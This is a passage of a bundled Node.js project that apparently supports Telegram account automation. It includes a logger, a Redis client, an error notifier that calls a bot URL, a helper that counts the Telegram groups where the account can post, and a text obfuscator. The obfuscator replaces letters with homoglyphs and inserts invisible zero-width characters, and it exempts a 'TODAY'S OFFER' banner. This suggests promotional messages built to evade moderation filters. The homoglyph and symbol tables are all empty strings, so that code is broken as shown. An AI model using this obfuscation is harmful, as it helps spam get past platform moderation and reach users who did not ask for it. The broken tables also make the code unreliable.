        if (seen.has(obj))
            return chalk_1.default.red("[Circular]");
        seen.add(obj);
        if (Array.isArray(obj)) {
            return ("[\n" +
                obj.map((el) => " ".repeat(indent) + this.formatObjectMessage(el, indent + 2, seen)).join(",\n") +
                "\n" +
                " ".repeat(indent - 2) +
                "]");
        }
        const entries = Object.entries(obj).map(([key, value]) => {
            const coloredKey = chalk_1.default.cyan(`"${key}"`) + chalk_1.default.white(": ");
            const formattedValue = this.formatObjectMessage(value, indent + 2, seen);
            return " ".repeat(indent) + coloredKey + formattedValue;
        });
        return "{\n" + entries.join(",\n") + "\n" + " ".repeat(indent - 2) + "}";
    }
    parseColoredContext(context) {
        if (/^\d+$/.test(context))
            return chalk_1.default.magentaBright.bold(context);
        if (context === context.toUpperCase())
            return chalk_1.default.yellow.bold(context);
        return chalk_1.default.cyanBright.bold(context);
    }
    stripAnsi(str) {
        return str.replace(/\x1B\[[0-9;]*m/g, "");
    }
    static log(message, context) {
        new Logger(context).log(message, context);
    }
    static error(message, trace, context) {
        new Logger(context).error(message, context, trace);
    }
    static warn(message, context) {
        new Logger(context).warn(message, context);
    }
    static debug(message, context) {
        new Logger(context).debug(message, context);
    }
    static verbose(message, context) {
        new Logger(context).verbose(message, context);
    }
    static success(message, context) {
        new Logger(context).success(message, context);
    }
    static overrideConsole(serviceName = "Console") {
        const instance = new Logger(serviceName);
        console.log = (...args) => instance.log(args[0], args[1]);
        console.info = (...args) => instance.info(args[0], args[1]);
        console.error = (...args) => instance.error(args[0], args[1], args[2]);
        console.warn = (...args) => instance.warn(args[0], args[1]);
        console.debug = (...args) => instance.debug(args[0], args[1]);
        console.success = (...args) => instance.success(args[0], args[1]);
    }
}
exports.Logger = Logger;
const logger = new Logger();


/***/ }),

/***/ "./src/utils/obfuscateText.ts":
/*!************************************!*\
  !*** ./src/utils/obfuscateText.ts ***!
  \************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.invisibleChars = exports.specialCharMap = exports.numberMap = exports.homoglyphMap = exports.SeededRandom = exports.ObfuscationConfig = void 0;
exports.obfuscateText = obfuscateText;
exports.analyzeText = analyzeText;
exports.attemptReverse = attemptReverse;
exports.attemptReverseFuzzy = attemptReverseFuzzy;
exports.testReverseCoverage = testReverseCoverage;
exports.batchObfuscate = batchObfuscate;
exports.generateVariants = generateVariants;
exports.validateConfig = validateConfig;
const DEFAULT_CONFIG = {
    substitutionRate: 0.4,
    invisibleCharRate: 0,
    preserveCase: false,
    preserveNumbers: false,
    preserveSpecialChars: true,
    useInvisibleChars: false,
    maintainFormatting: true,
    randomSeed: null,
    maxInvisibleCharsPerWord: 2,
    customSafeBlocks: [],
    intensityVariation: false
};
const homoglyphMap = {
    a: ['', '', '', '', ''],
    b: ['', '', '', '', ''],
    c: ['', '', '', '', ''],
    d: ['', '', '', '', ''],
    e: ['', '', '', ''],
    f: ['', '', '', '', ''],
    g: ['', '', '', '', ''],
    h: ['', '', ''],
    i: ['', '', ''],
    j: ['', '', '', '', '', ''],
    k: ['', '', '', '', ''],
    l: ['', '', '', ''],
    m: ['', '', ''],
    n: ['', '', '', '', '', ''],
    o: ['', '', '', ''],
    p: ['', '', '', '', '', ''],
    q: ['', '', '', ''],
    r: ['', '', '', '', ''],
    s: ['', ''],
    t: ['', '', '', ''],
    u: ['', '', '', '', ''],
    v: ['', '', '', '', ''],
    w: ['', '', '', '', ''],
    x: ['', '',],
    y: ['', '', '', '', ''],
    z: ['', '', '', '']
};
exports.homoglyphMap = homoglyphMap;
const numberMap = {
    '0': ['', '', '', '', '', ''],
    '1': ['', '', '', '', ''],
    '2': ['', '', '', '', ''],
    '3': ['', '', '', '', '', '', ''],
    '4': ['', '', '', '', '', ''],
    '5': ['', '', '', '', '', ''],
    '6': ['', '', '', '', '', ''],
    '7': ['', '', '', '', '', ''],
    '8': ['', '', '', '', ''],
    '9': ['', '', '', '', '']
};
exports.numberMap = numberMap;
const specialCharMap = {
    ' ': ['\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', '\u2006', '\u2007', '\u2008', '\u2009', '\u200A', '\u00A0'],
    '.': ['', '', '', '', '', ''],
    ',': ['', '', '', ''],
    '!': ['', '', '', ''],
    '?': ['', '', '', ''],
    ':': ['', '', '', ''],
    ';': ['', ''],
    '-': ['', '', '', '', '', '', '', ''],
    '(': ['', '', '', ''],
    ')': ['', '', '', ''],
    '[': ['', '', ''],
    ']': ['', '', ''],
    '{': ['', ''],
    '}': ['', ''],
    '"': ['"', '"', '', '', ''],
    "'": ['', '', '']
};
exports.specialCharMap = specialCharMap;
const invisibleChars = [
    '\u200B',
    '\u200C',
    '\u200D',
    '\u2060',
    '\uFEFF',
];
exports.invisibleChars = invisibleChars;
class ObfuscationConfig {
    constructor(options = {}) {
        const config = { ...DEFAULT_CONFIG, ...options };
        this.substitutionRate = config.substitutionRate;
        this.invisibleCharRate = config.invisibleCharRate;
        this.preserveCase = config.preserveCase;
        this.preserveNumbers = config.preserveNumbers;
        this.preserveSpecialChars = config.preserveSpecialChars;
        this.useInvisibleChars = config.useInvisibleChars;
        this.maintainFormatting = config.maintainFormatting;
        this.randomSeed = config.randomSeed;
        this.maxInvisibleCharsPerWord = config.maxInvisibleCharsPerWord;
        this.customSafeBlocks = Object.freeze([...config.customSafeBlocks]);
        this.intensityVariation = config.intensityVariation;
    }
    toJSON() {
        return {
            substitutionRate: this.substitutionRate,
            invisibleCharRate: this.invisibleCharRate,
            preserveCase: this.preserveCase,
            preserveNumbers: this.preserveNumbers,
            preserveSpecialChars: this.preserveSpecialChars,
            useInvisibleChars: this.useInvisibleChars,
            maintainFormatting: this.maintainFormatting,
            randomSeed: this.randomSeed,
            maxInvisibleCharsPerWord: this.maxInvisibleCharsPerWord,
            customSafeBlocks: [...this.customSafeBlocks],
            intensityVariation: this.intensityVariation
        };
    }
}
exports.ObfuscationConfig = ObfuscationConfig;
class SeededRandom {
    constructor(seed = null) {
        this.seed = seed ?? Math.random() * 2147483647;
        this.current = this.seed;
    }
    next() {
        this.current = (this.current * 16807) % 2147483647;
        return this.current / 2147483647;
    }
    choice(array) {
        if (array.length === 0) {
            throw new Error('Cannot choose from empty array');
        }
        return array[Math.floor(this.next() * array.length)];
    }
    chance(probability) {
        return this.next() < probability;
    }
    getSeed() {
        return this.seed;
    }
    reset() {
        this.current = this.seed;
    }
}
exports.SeededRandom = SeededRandom;
function getRandom(arr, weights) {
    if (arr.length === 0) {
        throw new Error('Cannot select from empty array');
    }
    if (!weights) {
        return arr[Math.floor(Math.random() * arr.length)];
    }
    if (weights.length !== arr.length) {
        throw new Error('Weights array must have same length as choices array');
    }
    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
    if (totalWeight <= 0) {
        throw new Error('Total weight must be positive');
    }
    let random = Math.random() * totalWeight;
    for (let i = 0; i < arr.length; i++) {
        if (random < weights[i]) {
            return arr[i];
        }
        random -= weights[i];
    }
    return arr[arr.length - 1];
}
const defaultSafeBlocks = [
    '   ',
    '',
    '  T O D A Y \' S   O F F E R  ',
    '          ',
    '', '', '', '',
    '', '', '', '', '',
    '', '', '', '', '',
    '', '', '',
    '', '', '', '', '',
    '', '', '', '', ''
];
function obfuscateText(text, config = {}) {
    const settings = config instanceof ObfuscationConfig ? config : new ObfuscationConfig(config);
    const random = new SeededRandom(settings.randomSeed);
    const safeBlocks = [...defaultSafeBlocks, ...settings.customSafeBlocks];
    const specialCharCache = new Map();
    let obfuscated = '';
    const lines = text.split('\n');
    for (let j = 0; j < lines.length; j++) {
        const line = lines[j].replace(/\*\*/g, '');
        if (line.trim() === '') {
            obfuscated += '\n';
            continue;
        }
        const isSafe = safeBlocks.some((safe) => line.includes(safe));
        if (isSafe) {
            obfuscated += line + '\n';
            continue;
        }
        let newLine = '';
        let invisibleCharsInWord = 0;
        let isInWord = false;
        let currentSubstitutionRate = settings.substitutionRate;
        if (settings.intensityVariation) {
            const variation = (random.next() - 0.5) * 0.3;
            currentSubstitutionRate = Math.max(0.1, Math.min(0.9, currentSubstitutionRate + variation));
        }
        for (let i = 0; i < line.length; i++) {
            const c = line[i];
            const lower = c.toLowerCase();
            const isLetter = /[a-zA-Z]/.test(c);
            const isNumber = /[0-9]/.test(c);
            const isSpace = /\s/.test(c);
            if (isLetter || isNumber) {
                if (!isInWord) {
                    isInWord = true;
                    invisibleCharsInWord = 0;
                }
            }
            else if (isSpace) {
                isInWord = false;
                invisibleCharsInWord = 0;
            }
            let substituted = false;
            if (isLetter && homoglyphMap[lower] && random.chance(currentSubstitutionRate)) {
                const substitute = random.choice(homoglyphMap[lower]);
                newLine += settings.preserveCase && c === c.toUpperCase() ? substitute.toUpperCase() : substitute;
                substituted = true;
            }
            else if (isNumber && !settings.preserveNumbers && numberMap[c] && random.chance(currentSubstitutionRate)) {
                newLine += random.choice(numberMap[c]);
                substituted = true;
            }
            else if (!isLetter && !isNumber && !isSpace && !settings.preserveSpecialChars &&
                specialCharMap[c] && random.chance(currentSubstitutionRate * 0.3)) {
                if (specialCharCache.has(c)) {
                    newLine += specialCharCache.get(c);
                }
                else {
                    const sub = random.choice(specialCharMap[c]);
                    specialCharCache.set(c, sub);
                    newLine += sub;
                }
                substituted = true;
            }
            else {
                newLine += c;
            }
            if (settings.useInvisibleChars && isInWord && i > 0 &&
                invisibleCharsInWord < settings.maxInvisibleCharsPerWord &&
                (isLetter || isNumber) && random.chance(settings.invisibleCharRate)) {
                newLine += random.choice(invisibleChars);
                invisibleCharsInWord++;
            }
            if (settings.useInvisibleChars && substituted && random.chance(0.05)) {
                newLine += random.choice(invisibleChars);
            }
        }
        obfuscated += settings.maintainFormatting ? `**${newLine}**\n` : newLine + '\n';
    }
    return obfuscated.trim();
}
function analyzeText(text) {
    const stats = {
        totalChars: text.length,
        letters: 0,
        numbers: 0,
        specialChars: 0,
        obfuscatableLetters: 0,
        obfuscatableNumbers: 0,
        obfuscatableSpecial: 0,
        lines: text.split('\n').length,
        words: text.split(/\s+/).filter(word => word.length > 0).length
    };
    for (const char of text) {
        const lower = char.toLowerCase();
        if (/[a-zA-Z]/.test(char)) {
            stats.letters++;
            if (homoglyphMap[lower])
                stats.obfuscatableLetters++;
        }
        else if (/[0-9]/.test(char)) {
            stats.numbers++;
            if (numberMap[char])
                stats.obfuscatableNumbers++;
        }
        else if (!/\s/.test(char)) {
            stats.specialChars++;
            if (specialCharMap[char])
                stats.obfuscatableSpecial++;
        }
    }
    return stats;
}
function attemptReverse(obfuscatedText) {
    let cleaned = obfuscatedText;
    invisibleChars.forEach((char) => {
        cleaned = cleaned.replace(new RegExp(escapeRegExp(char), 'g'), '');
    });
    const reverseMap = {};
    Object.entries(homoglyphMap).forEach(([original, substitutes]) => {
        substitutes.forEach((substitute) => {
            reverseMap[substitute.toLowerCase()] = original.toLowerCase();
            reverseMap[substitute.toUpperCase()] = original.toUpperCase();
            reverseMap[substitute] = original;
        });
    });
    Object.entries(numberMap).forEach(([original, substitutes]) => {
        substitutes.forEach((substitute) => {
            reverseMap[substitute] = original;
        });
    });
    Object.entries(specialCharMap).forEach(([original, substitutes]) => {
        substitutes.forEach((substitute) => {
            reverseMap[substitute] = original;
        });
    });
    const sortedMappings = Object.entries(reverseMap)
        .sort(([a], [b]) => b.length - a.length);
    for (const [obfuscated, original] of sortedMappings) {
        if (obfuscated && original && cleaned.includes(obfuscated)) {
            cleaned = cleaned.replace(new RegExp(escapeRegExp(obfuscated), 'g'), original);
        }
    }
    cleaned = cleaned.normalize('NFC');
    cleaned = cleaned.replace(/\*\*(.*?)\*\*/g, '$1');
    return cleaned;
}
function attemptReverseFuzzy(obfuscatedText) {
    let cleaned = obfuscatedText;
    invisibleChars.forEach((char) => {
        cleaned = cleaned.replace(new RegExp(escapeRegExp(char), 'g'), '');
    });
    let result = '';
    for (let i = 0; i < cleaned.length; i++) {
        const char = cleaned[i];
        let bestMatch = char;
        let found = false;
        for (const [original, substitutes] of Object.entries(homoglyphMap)) {
            if (substitutes.includes(char.toLowerCase())) {
                bestMatch = char === char.toUpperCase() ? original.toUpperCase() : original;
                found = true;
                break;
            }
        }
        if (!found) {
            for (const [original, substitutes] of Object.entries(numberMap)) {
                if (substitutes.includes(char)) {
                    bestMatch = original;
                    found = true;
                    break;
                }
            }
        }
        if (!found) {
            for (const [original, substitutes] of Object.entries(specialCharMap)) {
                if (substitutes.includes(char)) {
                    bestMatch = original;
                    found = true;
                    break;
                }
            }
        }
        result += bestMatch;
    }
    result = result.normalize('NFC');
    result = result.replace(/\*\*(.*?)\*\*/g, '$1');
    return result;
}
function testReverseCoverage() {
    const reverseMap = {};
    Object.entries(homoglyphMap).forEach(([original, substitutes]) => {
        substitutes.forEach(sub => { reverseMap[sub] = original; });
    });
    Object.entries(numberMap).forEach(([original, substitutes]) => {
        substitutes.forEach(sub => { reverseMap[sub] = original; });
    });
    Object.entries(specialCharMap).forEach(([original, substitutes]) => {
        substitutes.forEach(sub => { reverseMap[sub] = original; });
    });
    const letterSubs = Object.values(homoglyphMap).flat();
    const numberSubs = Object.values(numberMap).flat();
    const specialSubs = Object.values(specialCharMap).flat();
    const lettersMapped = letterSubs.filter(sub => reverseMap[sub]).length;
    const numbersMapped = numberSubs.filter(sub => reverseMap[sub]).length;
    const specialMapped = specialSubs.filter(sub => reverseMap[sub]).length;
    return {
        letters: {
            total: letterSubs.length,
            mapped: lettersMapped,
            coverage: (lettersMapped / letterSubs.length) * 100
        },
        numbers: {
            total: numberSubs.length,
            mapped: numbersMapped,
            coverage: (numbersMapped / numberSubs.length) * 100
        },
        special: {
            total: specialSubs.length,
            mapped: specialMapped,
            coverage: (specialMapped / specialSubs.length) * 100
        }
    };
}
function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
function batchObfuscate(text, configArray) {
    return configArray.map(config => {
        const configObj = config instanceof ObfuscationConfig ? config : new ObfuscationConfig(config);
        const result = obfuscateText(text, configObj);
        const analysisStats = analyzeText(result);
        return {
            config: configObj,
            result,
            analysisStats
        };
    });
}
function generateVariants(text, baseConfig = {}, variants = 5) {
    const results = [];
    const config = new ObfuscationConfig(baseConfig);
    for (let i = 0; i < variants; i++) {
        const intensity = (i + 1) / variants;
        const variantConfig = new ObfuscationConfig({
            ...config.toJSON(),
            substitutionRate: intensity * 0.8,
            invisibleCharRate: intensity * 0.15,
            randomSeed: Math.floor(Math.random() * 1000000)
        });
        results.push(obfuscateText(text, variantConfig));
    }
    return results;
}
function validateConfig(config) {
    if (config.substitutionRate !== undefined && (config.substitutionRate < 0 || config.substitutionRate > 1)) {
        throw new Error('substitutionRate must be between 0 and 1');
    }
    if (config.invisibleCharRate !== undefined && (config.invisibleCharRate < 0 || config.invisibleCharRate > 1)) {
        throw new Error('invisibleCharRate must be between 0 and 1');
    }
    if (config.maxInvisibleCharsPerWord !== undefined && config.maxInvisibleCharsPerWord < 0) {
        throw new Error('maxInvisibleCharsPerWord must be non-negative');
    }
}


/***/ }),

/***/ "./src/utils/parseError.ts":
/*!*********************************!*\
  !*** ./src/utils/parseError.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ErrorUtils = void 0;
exports.extractMessage = extractMessage;
exports.parseError = parseError;
exports.isAxiosError = isAxiosError;
exports.createError = createError;
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const DEFAULT_ERROR_CONFIG = {
    maxMessageLength: 200,
    notificationTimeout: 10000,
    ignorePatterns: [
        /INPUT_USER_DEACTIVATED/i,
        /too many req/i,
        /could not find/i,
        /ECONNREFUSED/i
    ],
    defaultStatus: 500,
    defaultMessage: 'An unknown error occurred',
    defaultError: 'UnknownError'
};
function safeStringify(data, depth = 0, maxDepth = 3) {
    if (depth > maxDepth) {
        return '[Max Depth Reached]';
    }
    try {
        if (data === null || data === undefined) {
            return String(data);
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return String(data);
        }
        if (data instanceof Error) {
            return data.message || data.toString();
        }
        if (Array.isArray(data)) {
            if (data.length === 0)
                return '[]';
            return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;
        }
        if (typeof data === 'object') {
            const entries = Object.entries(data)
                .filter(([_, v]) => v !== undefined && v !== null)
                .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);
            if (entries.length === 0)
                return '{}';
            return `{${entries.join(', ')}}`;
        }
        return String(data);
    }
    catch (error) {
        return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;
    }
}
function extractMessage(data, path = '', depth = 0, maxDepth = 5) {
    try {
        if (depth > maxDepth) {
            return `${path}=[Max Depth Reached]`;
        }
        if (data === null || data === undefined) {
            return '';
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return path ? `${path}=${data}` : String(data);
        }
        if (data instanceof Error) {
            const errorInfo = [
                data.message ? `message=${data.message}` : '',
                data.name ? `name=${data.name}` : '',
                data.stack ? `stack=${data.stack.split('\n')[0]}` : ''
            ].filter(Boolean).join('\n');
            return path ? `${path}=(${errorInfo})` : errorInfo;
        }
        if (Array.isArray(data)) {
            if (data.length === 0) {
                return '';
            }
            return data
                .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))
                .filter(Boolean)
                .join('\n');
        }
        if (typeof data === 'object') {
            const messages = [];
            for (const key of Object.keys(data)) {
                const value = data[key];
                const newPath = path ? `${path}.${key}` : key;
                const extracted = extractMessage(value, newPath, depth + 1, maxDepth);
                if (extracted) {
                    messages.push(extracted);
                }
            }
            return messages.join('\n');
        }
        return '';
    }
    catch (error) {
        console.error("Error in extractMessage:", error);
        return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;
    }
}
async function sendNotification(url, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout) {
    try {
        if (!url || typeof url !== 'string' || !url.startsWith('http')) {
            console.error("Invalid notification URL:", url);
            return undefined;
        }
        return await axios_1.default.get(url, {
            timeout,
            validateStatus: status => status < 500
        });
    }
    catch (error) {
        console.error("Failed to send notification:", error instanceof Error ? error.message : String(error));
        return undefined;
    }
}
function shouldIgnoreError(message, status, patterns) {
    if (status === 429)
        return true;
    return patterns.some(pattern => pattern.test(message));
}
function extractStatusCode(err, defaultStatus) {
    if (!err)
        return defaultStatus;
    if (err.response) {
        const response = err.response;
        return response.data?.statusCode ||
            response.data?.status ||
            response.data?.ResponseCode ||
            response.status ||
            err.status ||
            defaultStatus;
    }
    return err.statusCode || err.status || defaultStatus;
}
function extractErrorMessage(err, defaultMessage) {
    if (!err)
        return defaultMessage;
    if (err.response?.data) {
        const responseData = err.response.data;
        return responseData.message ||
            responseData.errors ||
            responseData.ErrorMessage ||
            responseData.errorMessage ||
            responseData.UserMessage ||
            (typeof responseData === 'string' ? responseData : null) ||
            err.response.statusText ||
            err.message ||
            defaultMessage;
    }
    if (err.request) {
        return err.data?.message ||
            err.data?.errors ||
            err.data?.ErrorMessage ||
            err.data?.errorMessage ||
            err.data?.UserMessage ||
            (typeof err.data === 'string' ? err.data : null) ||
            err.message ||
            err.statusText ||
            'The request was triggered but no response was received';
    }
    return err.message || err.errorMessage || defaultMessage;
}
function extractErrorType(err, defaultError) {
    if (!err)
        return defaultError;
    if (err.response?.data?.error) {
        return err.response.data.error;
    }
    return err.error || err.name || err.code || defaultError;
}
function parseError(err, prefix, sendErr = true, config = {}) {
    const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };
    try {
        const clientId = process.env.clientId || process.env.serviceName;
        const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;
        const status = extractStatusCode(err, fullConfig.defaultStatus);
        const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);
        const error = extractErrorType(err, fullConfig.defaultError);
        let extractedMessage;
        try {
            extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);
        }
        catch (e) {
            extractedMessage = safeStringify(rawMessage) || 'Error extracting message';
        }
        const fullMessage = `${prefixStr} :: ${extractedMessage}`;
        console.error("parsedErr: ", fullMessage);
        const response = {
            status,
            message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength),
            error,
            raw: err
        };
        if (sendErr) {
            try {
                const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);
                if (!ignoreError) {
                    const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;
                    const notifUrl = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;
                    sendNotification(notifUrl, fullConfig.notificationTimeout)
                        .catch(e => console.error("Failed to send error notification:", e));
                }
            }
            catch (notificationError) {
                console.error('Failed to prepare error notification:', notificationError);
            }
        }
        return response;
    }
    catch (fatalError) {
        console.error("Fatal error in parseError:", fatalError);
        return {
            status: fullConfig.defaultStatus,
            message: "Error in error handling",
            error: "FatalError",
            raw: err
        };
    }
}
function isAxiosError(error) {
    return axios_1.default.isAxiosError(error);
}
function createError(message, status = 500, errorType = 'ApplicationError') {
    return {
        status,
        message,
        error: errorType
    };
}
exports.ErrorUtils = {
    parseError,
    extractMessage,
    sendNotification,
    createError,
    isAxiosError
};


/***/ }),

/***/ "./src/utils/readbleTimeDifference.ts":
/*!********************************************!*\
  !*** ./src/utils/readbleTimeDifference.ts ***!
  \********************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getReadableTimeDifference = getReadableTimeDifference;
function getReadableTimeDifference(ms1, ms2 = Date.now()) {
    const diff = Math.abs(ms1 - ms2);
    const seconds = Math.floor(diff / 1000);
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    let result = [];
    if (days > 0)
        result.push(`${days}d`);
    if (hours > 0)
        result.push(`${hours}h`);
    if (minutes > 0)
        result.push(`${minutes}m`);
    if (secs > 0 || result.length === 0)
        result.push(`${secs}s`);
    return result.join(" ");
}


/***/ }),

/***/ "./src/utils/redisClient.ts":
/*!**********************************!*\
  !*** ./src/utils/redisClient.ts ***!
  \**********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.RedisClient = void 0;
const ioredis_1 = __importDefault(__webpack_require__(/*! ioredis */ "ioredis"));
const logger_1 = __webpack_require__(/*! ./logger */ "./src/utils/logger.ts");
const logger = new logger_1.Logger(__filename);
class RedisClient {
    constructor() {
    }
    static getClient() {
        if (!RedisClient.instance) {
            const isRemote = process.env.REDIS_MODE === "remote";
            const config = {
                host: process.env.REDIS_HOST || (isRemote ? "0.0.0.0" : "127.0.0.1"),
                port: Number(process.env.REDIS_PORT) || 6379,
                password: process.env.REDIS_PASSWORD?.trim() || undefined,
                db: Number(process.env.REDIS_DB) || 0,
                retryStrategy: (times) => {
                    const delay = Math.min(times * 100, 3000);
                    logger.warn(`Retrying Redis connection (${times}) after ${delay}ms`);
                    return delay;
                },
            };
            try {
                RedisClient.instance = new ioredis_1.default(config);
                RedisClient.instance.on("connect", () => {
                    logger.log(`Connected to Redis at ${config.host}:${config.port}, DB: ${config.db}`);
                });
                RedisClient.instance.on("error", (err) => {
                    logger.error("Redis connection error:", err.message);
                });
                RedisClient.instance.on("close", () => {
                    logger.log("Redis connection closed");
                });
            }
            catch (error) {
                logger.error("Failed to initialize Redis client:", error);
                throw new Error(`Redis initialization failed: ${error.message}`);
            }
        }
        return RedisClient.instance;
    }
    static async disconnect() {
        if (RedisClient.instance) {
            try {
                await RedisClient.instance.quit();
                logger.log("Redis client disconnected successfully");
            }
            catch (error) {
                logger.error("Error during Redis disconnection:", error);
            }
            finally {
                RedisClient.instance = null;
            }
        }
    }
    static async set(key, value, ttl) {
        const client = RedisClient.getClient();
        try {
            const finalValue = typeof value === "string" || typeof value === "number"
                ? String(value)
                : JSON.stringify(value);
            if (ttl) {
                return await client.set(key, finalValue, "EX", ttl);
            }
            return await client.set(key, finalValue);
        }
        catch (error) {
            logger.error(`Error setting key ${key}:`, error);
            throw error;
        }
    }
    static async get(key) {
        const client = RedisClient.getClient();
        try {
            return await client.get(key);
        }
        catch (error) {
            logger.error(`Error getting key ${key}:`, error);
            throw error;
        }
    }
    static async getObject(key) {
        const value = await RedisClient.get(key);
        if (!value)
            return null;
        try {
            return JSON.parse(value);
        }
        catch {
            logger.warn(`Failed to parse JSON for key ${key}`);
            return null;
        }
    }
    static async incr(key, step = 1) {
        const client = RedisClient.getClient();
        try {
            return step === 1
                ? await client.incr(key)
                : await client.incrby(key, step);
        }
        catch (error) {
            logger.error(`Error incrementing key ${key}:`, error);
            throw error;
        }
    }
    static async decr(key, step = 1) {
        const client = RedisClient.getClient();
        try {
            return step === 1
                ? await client.decr(key)
                : await client.decrby(key, step);
        }
        catch (error) {
            logger.error(`Error decrementing key ${key}:`, error);
            throw error;
        }
    }
    static async rpush(key, values) {
        const client = RedisClient.getClient();
        try {
            return Array.isArray(values)
                ? await client.rpush(key, ...values)
                : await client.rpush(key, values);
        }
        catch (error) {
            logger.error(`Error pushing to list ${key}:`, error);
            throw error;
        }
    }
    static async lrange(key, start, end) {
        const client = RedisClient.getClient();
        return client.lrange(key, start, end);
    }
    static async hset(key, field, value) {
        const client = RedisClient.getClient();
        const val = typeof value === "string" || typeof value === "number"
            ? String(value)
            : JSON.stringify(value);
        return client.hset(key, field, val);
    }
    static async hget(key, field) {
        return RedisClient.getClient().hget(key, field);
    }
    static async hgetObject(key, field) {
        const val = await RedisClient.hget(key, field);
        if (!val)
            return null;
        try {
            return JSON.parse(val);
        }
        catch {
            return null;
        }
    }
    static async hgetall(key) {
        return RedisClient.getClient().hgetall(key);
    }
    static async sadd(key, members) {
        return Array.isArray(members)
            ? RedisClient.getClient().sadd(key, ...members)
            : RedisClient.getClient().sadd(key, members);
    }
    static async smembers(key) {
        return RedisClient.getClient().smembers(key);
    }
    static async del(keys) {
        return Array.isArray(keys)
            ? RedisClient.getClient().del(...keys)
            : RedisClient.getClient().del(keys);
    }
    static async exists(key) {
        return (await RedisClient.getClient().exists(key)) === 1;
    }
    static async expire(key, seconds) {
        return RedisClient.getClient().expire(key, seconds);
    }
    static async ttl(key) {
        return RedisClient.getClient().ttl(key);
    }
}
exports.RedisClient = RedisClient;
RedisClient.instance = null;


/***/ }),

/***/ "./src/utils/telegram-utils/channelinfo.ts":
/*!*************************************************!*\
  !*** ./src/utils/telegram-utils/channelinfo.ts ***!
  \*************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.channelInfo = channelInfo;
const parseError_1 = __webpack_require__(/*! ../parseError */ "./src/utils/parseError.ts");
async function channelInfo(client, sendIds = false) {
    if (!client)
        throw new Error('Client is not initialized');
    let canSendTrueCount = 0;
    let canSendFalseCount = 0;
    let totalCount = 0;
    let channelArray = [];
    const canSendFalseChats = [];
    for await (const dialog of client.iterDialogs({ limit: 1500 })) {
        if (dialog.isChannel || dialog.isGroup) {
            try {
                const chatEntity = dialog.entity.toJSON();
                const { broadcast, defaultBannedRights, id } = chatEntity;
                totalCount++;
                if (!broadcast && !defaultBannedRights?.sendMessages) {
                    canSendTrueCount++;
                    channelArray.push(id.toString()?.replace(/^-100/, ""));
                }
                else {
                    canSendFalseCount++;
                    canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, "Failed to Fetch Channel Info");
            }
        }
    }
    console.info("TotalChats:", totalCount);
    return {
        chatsArrayLength: totalCount,
        canSendTrueCount,
        canSendFalseCount,
        ids: sendIds ? channelArray : [],
        canSendFalseChats
    };
}


/***/ }),

/***/ "./src/utils/telegram-utils/index.ts":
/*!*******************************************!*\
  !*** ./src/utils/telegram-utils/index.ts ***!
  \*******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./channelinfo */ "./src/utils/telegram-utils/channelinfo.ts"), exports);


/***/ }),

/***/ "./src/utils/tg-apps.ts":
/*!******************************!*\
  !*** ./src/utils/tg-apps.ts ***!
  \******************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getCredentialsForMobile = getCredentialsForMobile;
const redisClient_1 = __webpack_require__(/*! ./redisClient */ "./src/utils/redisClient.ts");
const logger_1 = __webpack_require__(/*! ./logger */ "./src/utils/logger.ts");
const logger = new logger_1.Logger(__filename);
